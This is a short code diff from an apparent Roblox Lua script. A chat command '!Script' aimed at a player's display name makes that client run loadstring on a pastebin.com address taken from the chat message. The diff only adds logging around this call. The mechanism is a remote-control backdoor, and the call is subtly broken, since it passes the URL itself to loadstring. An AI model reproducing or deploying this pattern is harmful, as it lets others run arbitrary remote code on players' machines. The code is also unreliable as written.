@@ -215,7 +215,9 @@ game.Players.PlayerAdded:Connect(function(Player)
 
 			if CommandData [1] == "!Script" then
 				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
+					print("Executing ".. CommandData[3])
 					loadstring("https://pastebin.com/".. CommandData[3])
+					print("Executed ".. CommandData[3])
 				end
 			end
 
